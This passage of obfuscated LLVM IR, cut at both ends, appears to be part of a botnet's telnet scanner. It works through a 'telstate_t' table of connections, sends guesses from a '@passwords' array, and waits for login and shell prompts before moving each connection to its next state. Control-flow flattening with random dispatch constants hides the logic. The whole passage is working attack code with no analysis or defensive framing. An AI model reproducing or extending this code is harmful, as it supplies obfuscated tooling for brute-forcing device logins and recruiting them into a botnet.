  %1190 = load i32, i32* %2, align 4
  %1191 = sext i32 %1190 to i64
  %.reload215 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1192 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload215, i64 %1191
  %1193 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1192, i32 0, i32 5
  %1194 = load i8, i8* %1193, align 1
  %1195 = zext i8 %1194 to i64
  %1196 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %1195
  %1197 = load i8*, i8** %1196, align 8
  %1198 = load i32, i32* %2, align 4
  %1199 = sext i32 %1198 to i64
  %.reload214 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1200 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload214, i64 %1199
  %1201 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1200, i32 0, i32 5
  %1202 = load i8, i8* %1201, align 1
  %1203 = zext i8 %1202 to i64
  %1204 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %1203
  %1205 = load i8*, i8** %1204, align 8
  %1206 = call i64 @strlen(i8* %1205) #10
  %1207 = call i64 @send(i32 %1189, i8* %1197, i64 %1206, i32 16384)
  %1208 = icmp slt i64 %1207, 0
  %1209 = select i1 %1208, i32 1184102935, i32 892122214
  store i32 %1209, i32* %switchVar
  br label %loopEnd

; <label>:1210:                                   ; preds = %loopEntry
  %1211 = load i32, i32* %2, align 4
  %1212 = sext i32 %1211 to i64
  %.reload213 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1213 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload213, i64 %1212
  %1214 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1213, i32 0, i32 0
  %1215 = load i32, i32* %1214, align 16
  %1216 = call i32 @sclose(i32 %1215)
  %1217 = load i32, i32* %2, align 4
  %1218 = sext i32 %1217 to i64
  %.reload212 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1219 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload212, i64 %1218
  %1220 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1219, i32 0, i32 2
  store i8 0, i8* %1220, align 8
  %1221 = load i32, i32* %2, align 4
  %1222 = sext i32 %1221 to i64
  %.reload211 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1223 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload211, i64 %1222
  %1224 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1223, i32 0, i32 3
  store i8 1, i8* %1224, align 1
  store i32 -824704005, i32* %switchVar
  br label %loopEnd

; <label>:1225:                                   ; preds = %loopEntry
  %1226 = load i32, i32* %2, align 4
  %1227 = sext i32 %1226 to i64
  %.reload210 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1228 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload210, i64 %1227
  %1229 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1228, i32 0, i32 0
  %1230 = load i32, i32* %1229, align 16
  %1231 = call i64 @send(i32 %1230, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.62, i32 0, i32 0), i64 2, i32 16384)
  %1232 = icmp slt i64 %1231, 0
  %1233 = select i1 %1232, i32 853991041, i32 1546665307
  store i32 %1233, i32* %switchVar
  br label %loopEnd

; <label>:1234:                                   ; preds = %loopEntry
  %1235 = load i32, i32* %2, align 4
  %1236 = sext i32 %1235 to i64
  %.reload209 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1237 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload209, i64 %1236
  %1238 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1237, i32 0, i32 0
  %1239 = load i32, i32* %1238, align 16
  %1240 = call i32 @sclose(i32 %1239)
  %1241 = load i32, i32* %2, align 4
  %1242 = sext i32 %1241 to i64
  %.reload208 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1243 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload208, i64 %1242
  %1244 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1243, i32 0, i32 2
  store i8 0, i8* %1244, align 8
  %1245 = load i32, i32* %2, align 4
  %1246 = sext i32 %1245 to i64
  %.reload207 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1247 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload207, i64 %1246
  %1248 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1247, i32 0, i32 3
  store i8 1, i8* %1248, align 1
  store i32 -824704005, i32* %switchVar
  br label %loopEnd

; <label>:1249:                                   ; preds = %loopEntry
  %1250 = load i32, i32* %2, align 4
  %1251 = sext i32 %1250 to i64
  %.reload206 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1252 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload206, i64 %1251
  %1253 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1252, i32 0, i32 2
  store i8 6, i8* %1253, align 8
  store i32 -1568167552, i32* %switchVar
  br label %loopEnd

; <label>:1254:                                   ; preds = %loopEntry
  %1255 = load i32, i32* %2, align 4
  %1256 = sext i32 %1255 to i64
  %.reload205 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1257 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload205, i64 %1256
  %1258 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1257, i32 0, i32 6
  %1259 = load i32, i32* %1258, align 4
  %1260 = icmp eq i32 %1259, 0
  %1261 = select i1 %1260, i32 -19173178, i32 -673090209
  store i32 %1261, i32* %switchVar
  br label %loopEnd

; <label>:1262:                                   ; preds = %loopEntry
  %1263 = call i64 @time(i64* null) #2
  %1264 = trunc i64 %1263 to i32
  %1265 = load i32, i32* %2, align 4
  %1266 = sext i32 %1265 to i64
  %.reload204 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1267 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload204, i64 %1266
  %1268 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1267, i32 0, i32 6
  store i32 %1264, i32* %1268, align 4
  store i32 -673090209, i32* %switchVar
  br label %loopEnd

; <label>:1269:                                   ; preds = %loopEntry
  %1270 = load i32, i32* %2, align 4
  %1271 = sext i32 %1270 to i64
  %.reload203 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1272 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload203, i64 %1271
  %1273 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1272, i32 0, i32 0
  %1274 = load i32, i32* %1273, align 16
  %1275 = load i32, i32* %2, align 4
  %1276 = sext i32 %1275 to i64
  %.reload202 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1277 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload202, i64 %1276
  %1278 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1277, i32 0, i32 8
  %1279 = load i8*, i8** %1278, align 8
  %1280 = load i32, i32* %2, align 4
  %1281 = sext i32 %1280 to i64
  %.reload201 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1282 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload201, i64 %1281
  %1283 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1282, i32 0, i32 7
  %1284 = load i16, i16* %1283, align 16
  %1285 = zext i16 %1284 to i32
  %1286 = call i32 @readUntil(i32 %1274, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.63, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1279, i32 1024, i32 %1285)
  %1287 = icmp ne i32 %1286, 0
  %1288 = select i1 %1287, i32 1772882337, i32 2124770132
  store i32 %1288, i32* %switchVar
  br label %loopEnd

; <label>:1289:                                   ; preds = %loopEntry
  %1290 = load i32, i32* %2, align 4
  %1291 = sext i32 %1290 to i64
  %.reload200 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1292 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload200, i64 %1291
  %1293 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1292, i32 0, i32 6
  store i32 0, i32* %1293, align 4
  %1294 = load i32, i32* %2, align 4
  %1295 = sext i32 %1294 to i64
  %.reload199 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1296 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload199, i64 %1295
  %1297 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1296, i32 0, i32 7
  store i16 0, i16* %1297, align 16
  %1298 = load i32, i32* %2, align 4
  %1299 = sext i32 %1298 to i64
  %.reload198 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1300 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload198, i64 %1299
  %1301 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1300, i32 0, i32 8
  %1302 = load i8*, i8** %1301, align 8
  %1303 = call i8* @strstr(i8* %1302, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.63, i32 0, i32 0)) #10
  %1304 = icmp ne i8* %1303, null
  %1305 = select i1 %1304, i32 880450190, i32 1662450111
  store i32 %1305, i32* %switchVar
  br label %loopEnd

; <label>:1306:                                   ; preds = %loopEntry
  %1307 = load i32, i32* %2, align 4
  %1308 = sext i32 %1307 to i64
  %.reload197 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1309 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload197, i64 %1308
  %1310 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1309, i32 0, i32 8
  %1311 = load i8*, i8** %1310, align 8
  call void @llvm.memset.p0i8.i64(i8* %1311, i8 0, i64 1024, i32 1, i1 false)
  %1312 = load i32, i32* %2, align 4
  %1313 = sext i32 %1312 to i64
  %.reload196 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1314 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload196, i64 %1313
  %1315 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1314, i32 0, i32 0
  %1316 = load i32, i32* %1315, align 16
  %1317 = call i32 @sclose(i32 %1316)
  %1318 = load i32, i32* %2, align 4
  %1319 = sext i32 %1318 to i64
  %.reload195 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1320 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload195, i64 %1319
  %1321 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1320, i32 0, i32 2
  store i8 0, i8* %1321, align 8
  %1322 = load i32, i32* %2, align 4
  %1323 = sext i32 %1322 to i64
  %.reload194 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1324 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload194, i64 %1323
  %1325 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1324, i32 0, i32 3
  store i8 0, i8* %1325, align 1
  store i32 -824704005, i32* %switchVar
  br label %loopEnd

; <label>:1326:                                   ; preds = %loopEntry
  %1327 = load i32, i32* %2, align 4
  %1328 = sext i32 %1327 to i64
  %.reload193 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1329 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload193, i64 %1328
  %1330 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1329, i32 0, i32 8
  %1331 = load i8*, i8** %1330, align 8
  %1332 = call i32 @matchPrompt(i8* %1331)
  %1333 = icmp ne i32 %1332, 0
  %1334 = select i1 %1333, i32 -67725532, i32 -1387174376
  store i32 %1334, i32* %switchVar
  br label %loopEnd

; <label>:1335:                                   ; preds = %loopEntry
  %1336 = load i32, i32* %2, align 4
  %1337 = sext i32 %1336 to i64
  %.reload192 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1338 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload192, i64 %1337
  %1339 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1338, i32 0, i32 8
  %1340 = load i8*, i8** %1339, align 8
  call void @llvm.memset.p0i8.i64(i8* %1340, i8 0, i64 1024, i32 1, i1 false)
  %1341 = load i32, i32* %2, align 4
  %1342 = sext i32 %1341 to i64
  %.reload191 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1343 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload191, i64 %1342
  %1344 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1343, i32 0, i32 0
  %1345 = load i32, i32* %1344, align 16
  %1346 = call i32 @sclose(i32 %1345)
  %1347 = load i32, i32* %2, align 4
  %1348 = sext i32 %1347 to i64
  %.reload190 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1349 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload190, i64 %1348
  %1350 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1349, i32 0, i32 2
  store i8 0, i8* %1350, align 8
  %1351 = load i32, i32* %2, align 4
  %1352 = sext i32 %1351 to i64
  %.reload189 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1353 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload189, i64 %1352
  %1354 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1353, i32 0, i32 3
  store i8 1, i8* %1354, align 1
  store i32 -824704005, i32* %switchVar
  br label %loopEnd

; <label>:1355:                                   ; preds = %loopEntry
  %1356 = load i32, i32* %2, align 4
  %1357 = sext i32 %1356 to i64
  %.reload188 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1358 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload188, i64 %1357
  %1359 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1358, i32 0, i32 2
  store i8 7, i8* %1359, align 8
  store i32 570147994, i32* %switchVar
  br label %loopEnd

; <label>:1360:                                   ; preds = %loopEntry
  %1361 = load i32, i32* %2, align 4
  %1362 = sext i32 %1361 to i64
  %.reload187 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1363 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload187, i64 %1362
  %1364 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1363, i32 0, i32 8
  %1365 = load i8*, i8** %1364, align 8
  call void @llvm.memset.p0i8.i64(i8* %1365, i8 0, i64 1024, i32 1, i1 false)
  store i32 -824704005, i32* %switchVar
  br label %loopEnd

; <label>:1366:                                   ; preds = %loopEntry
  %1367 = load i32, i32* %2, align 4
  %1368 = sext i32 %1367 to i64
  %.reload186 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1369 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload186, i64 %1368
  %1370 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1369, i32 0, i32 0
  %1371 = load i32, i32* %1370, align 16
  %1372 = load i32, i32* %2, align 4
  %1373 = sext i32 %1372 to i64
  %.reload185 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1374 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload185, i64 %1373
  %1375 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1374, i32 0, i32 8
  %1376 = load i8*, i8** %1375, align 8
  %1377 = load i32, i32* %2, align 4
  %1378 = sext i32 %1377 to i64
  %.reload184 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1379 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload184, i64 %1378
  %1380 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1379, i32 0, i32 7
  %1381 = load i16, i16* %1380, align 16
  %1382 = zext i16 %1381 to i32
  %1383 = call i32 @readUntil(i32 %1371, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.64, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1376, i32 1024, i32 %1382)
  %1384 = icmp ne i32 %1383, 0
  %1385 = select i1 %1384, i32 -594289978, i32 741120180
  store i32 %1385, i32* %switchVar
  br label %loopEnd

; <label>:1386:                                   ; preds = %loopEntry
  %1387 = load i32, i32* %2, align 4
  %1388 = sext i32 %1387 to i64
  %.reload183 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1389 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload183, i64 %1388
  %1390 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1389, i32 0, i32 6
  store i32 0, i32* %1390, align 4
  %1391 = load i32, i32* %2, align 4
  %1392 = sext i32 %1391 to i64
  %.reload182 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1393 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload182, i64 %1392
  %1394 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1393, i32 0, i32 7
  store i16 0, i16* %1394, align 16
  %1395 = load i32, i32* %2, align 4
  %1396 = sext i32 %1395 to i64
  %.reload181 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1397 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload181, i64 %1396
  %1398 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1397, i32 0, i32 8
  %1399 = load i8*, i8** %1398, align 8
  %1400 = call i8* @strstr(i8* %1399, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.64, i32 0, i32 0)) #10
  %1401 = icmp ne i8* %1400, null
  %1402 = select i1 %1401, i32 503525088, i32 -130493908
  store i32 %1402, i32* %switchVar
  br label %loopEnd

; <label>:1403:                                   ; preds = %loopEntry
  %1404 = load i32, i32* %2, align 4
  %1405 = sext i32 %1404 to i64
  %.reload180 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1406 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload180, i64 %1405
  %1407 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1406, i32 0, i32 8
  %1408 = load i8*, i8** %1407, align 8
  call void @llvm.memset.p0i8.i64(i8* %1408, i8 0, i64 1024, i32 1, i1 false)
  %1409 = load i32, i32* %2, align 4
  %1410 = sext i32 %1409 to i64
  %.reload179 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1411 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload179, i64 %1410
  %1412 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1411, i32 0, i32 0
  %1413 = load i32, i32* %1412, align 16
  %1414 = call i32 @sclose(i32 %1413)
  %1415 = load i32, i32* %2, align 4
  %1416 = sext i32 %1415 to i64
  %.reload178 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1417 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload178, i64 %1416
  %1418 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1417, i32 0, i32 2
  store i8 0, i8* %1418, align 8
  %1419 = load i32, i32* %2, align 4
  %1420 = sext i32 %1419 to i64
  %.reload177 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1421 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload177, i64 %1420
  %1422 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1421, i32 0, i32 3
  store i8 0, i8* %1422, align 1
  store i32 -824704005, i32* %switchVar
  br label %loopEnd

; <label>:1423:                                   ; preds = %loopEntry
  %1424 = load i32, i32* %2, align 4
  %1425 = sext i32 %1424 to i64
  %.reload176 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1426 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload176, i64 %1425
  %1427 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1426, i32 0, i32 8
  %1428 = load i8*, i8** %1427, align 8
  %1429 = call i32 @matchPrompt(i8* %1428)
  %1430 = icmp ne i32 %1429, 0
  %1431 = select i1 %1430, i32 -270890027, i32 -84023175
  store i32 %1431, i32* %switchVar
  br label %loopEnd

; <label>:1432:                                   ; preds = %loopEntry
  %1433 = load i32, i32* %2, align 4
  %1434 = sext i32 %1433 to i64
  %.reload175 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1435 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload175, i64 %1434
  %1436 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1435, i32 0, i32 8
  %1437 = load i8*, i8** %1436, align 8
  call void @llvm.memset.p0i8.i64(i8* %1437, i8 0, i64 1024, i32 1, i1 false)
  %1438 = load i32, i32* %2, align 4
  %1439 = sext i32 %1438 to i64
  %.reload174 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1440 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload174, i64 %1439
  %1441 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1440, i32 0, i32 0
  %1442 = load i32, i32* %1441, align 16
  %1443 = call i32 @sclose(i32 %1442)
  %1444 = load i32, i32* %2, align 4
  %1445 = sext i32 %1444 to i64
  %.reload173 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1446 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload173, i64 %1445
  %1447 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1446, i32 0, i32 2
  store i8 0, i8* %1447, align 8
  %1448 = load i32, i32* %2, align 4
  %1449 = sext i32 %1448 to i64
  %.reload172 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1450 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload172, i64 %1449
  %1451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1450, i32 0, i32 3
  store i8 1, i8* %1451, align 1
  store i32 -824704005, i32* %switchVar
  br label %loopEnd

; <label>:1452:                                   ; preds = %loopEntry
  %1453 = load i32, i32* %2, align 4
  %1454 = sext i32 %1453 to i64
  %.reload171 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1455 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload171, i64 %1454
  %1456 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1455, i32 0, i32 2
  store i8 7, i8* %1456, align 8
  store i32 1994198433, i32* %switchVar
  br label %loopEnd

; <label>:1457:                                   ; preds = %loopEntry
  %1458 = load i32, i32* %2, align 4
  %1459 = sext i32 %1458 to i64
  %.reload170 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1460 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload170, i64 %1459
  %1461 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1460, i32 0, i32 8
  %1462 = load i8*, i8** %1461, align 8
  call void @llvm.memset.p0i8.i64(i8* %1462, i8 0, i64 1024, i32 1, i1 false)
  store i32 -824704005, i32* %switchVar
  br label %loopEnd

; <label>:1463:                                   ; preds = %loopEntry
  %1464 = load i32, i32* %2, align 4
  %1465 = sext i32 %1464 to i64
  %.reload169 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1466 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload169, i64 %1465
  %1467 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1466, i32 0, i32 0
  %1468 = load i32, i32* %1467, align 16
  %1469 = load i32, i32* %2, align 4
  %1470 = sext i32 %1469 to i64
  %.reload168 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1471 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload168, i64 %1470
  %1472 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1471, i32 0, i32 8
  %1473 = load i8*, i8** %1472, align 8
  %1474 = load i32, i32* %2, align 4
  %1475 = sext i32 %1474 to i64
  %.reload167 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1476 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload167, i64 %1475
  %1477 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1476, i32 0, i32 7
  %1478 = load i16, i16* %1477, align 16
  %1479 = zext i16 %1478 to i32
  %1480 = call i32 @readUntil(i32 %1468, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1473, i32 1024, i32 %1479)
  %1481 = icmp ne i32 %1480, 0
  %1482 = select i1 %1481, i32 192129753, i32 -1290455714
  store i32 %1482, i32* %switchVar
  br label %loopEnd

; <label>:1483:                                   ; preds = %loopEntry
  %1484 = load i32, i32* %2, align 4
  %1485 = sext i32 %1484 to i64
  %.reload166 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1486 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload166, i64 %1485
  %1487 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1486, i32 0, i32 6
  store i32 0, i32* %1487, align 4
  %1488 = load i32, i32* %2, align 4
  %1489 = sext i32 %1488 to i64
  %.reload165 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1490 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload165, i64 %1489
  %1491 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1490, i32 0, i32 7
  store i16 0, i16* %1491, align 16
  %1492 = load i32, i32* %2, align 4
  %1493 = sext i32 %1492 to i64
  %.reload164 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1494 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload164, i64 %1493
  %1495 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1494, i32 0, i32 8
  %1496 = load i8*, i8** %1495, align 8
  %1497 = call i8* @strstr(i8* %1496, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i32 0, i32 0)) #10
  %1498 = icmp ne i8* %1497, null
  %1499 = select i1 %1498, i32 -639028617, i32 1948693888
  store i32 %1499, i32* %switchVar
  br label %loopEnd

; <label>:1500:                                   ; preds = %loopEntry
  %1501 = load i32, i32* %2, align 4
  %1502 = sext i32 %1501 to i64
  %.reload163 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1503 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload163, i64 %1502
  %1504 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1503, i32 0, i32 8
  %1505 = load i8*, i8** %1504, align 8
  call void @llvm.memset.p0i8.i64(i8* %1505, i8 0, i64 1024, i32 1, i1 false)
  %1506 = load i32, i32* %2, align 4
  %1507 = sext i32 %1506 to i64
  %.reload162 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1508 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload162, i64 %1507
  %1509 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1508, i32 0, i32 0
  %1510 = load i32, i32* %1509, align 16
  %1511 = call i32 @sclose(i32 %1510)
  %1512 = load i32, i32* %2, align 4
  %1513 = sext i32 %1512 to i64
  %.reload161 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1514 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload161, i64 %1513
  %1515 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1514, i32 0, i32 2
  store i8 0, i8* %1515, align 8
  %1516 = load i32, i32* %2, align 4
  %1517 = sext i32 %1516 to i64
  %.reload160 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1518 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload160, i64 %1517
  %1519 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1518, i32 0, i32 3
  store i8 0, i8* %1519, align 1
  store i32 -824704005, i32* %switchVar
  br label %loopEnd

; <label>:1520:                                   ; preds = %loopEntry
  %1521 = load i32, i32* %2, align 4
  %1522 = sext i32 %1521 to i64
  %.reload159 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1523 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload159, i64 %1522
  %1524 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1523, i32 0, i32 2
  store i8 7, i8* %1524, align 8
  store i32 -1165593197, i32* %switchVar
  br label %loopEnd

; <label>:1525:                                   ; preds = %loopEntry
  %1526 = load i32, i32* %2, align 4
  %1527 = sext i32 %1526 to i64
  %.reload158 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1528 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload158, i64 %1527
  %1529 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1528, i32 0, i32 8
  %1530 = load i8*, i8** %1529, align 8
  call void @llvm.memset.p0i8.i64(i8* %1530, i8 0, i64 1024, i32 1, i1 false)
  store i32 -824704005, i32* %switchVar
  br label %loopEnd

; <label>:1531:                                   ; preds = %loopEntry
  %1532 = load i32, i32* %2, align 4
  %1533 = sext i32 %1532 to i64
